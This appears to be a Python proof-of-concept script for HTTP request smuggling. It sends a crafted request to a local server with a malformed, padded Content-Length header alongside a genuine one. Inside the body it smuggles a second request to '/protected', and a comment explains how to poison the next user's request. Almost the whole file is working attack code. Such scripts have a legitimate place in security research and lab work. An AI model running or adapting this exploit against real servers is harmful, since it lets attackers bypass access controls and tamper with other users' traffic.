import socket
import sys

SERVER = "127.0.0.1"
PORT = 80

PAYLOAD = (
    b"GET / HTTP/1.1\r\n" +
    b"Host: localhost\r\n" +
    b"Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\n" +
    b"Content-Length: 46\r\n" +
    b"\r\n" +
    b"GET /protected HTTP/1.1\r\n" +
    b"Host: localhost\r\n" +                
    b"X: x"
)

# Leave this section commented this if you to poison the next user's request
# PAYLOAD += (
#     b"GET / HTTP/1.1\r\n" +
#     b"Host: localhost\r\n" +
#     b"\r\n"
# )

def visualise_payload():
    print(PAYLOAD.decode().replace("\r\n", "\\r\\n\r\n"))

def main():
    visualise_payload()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(True)
    sock.connect((SERVER, PORT))
    sock.send(PAYLOAD)
    sock.close()

if __name__  == "__main__":
    main()
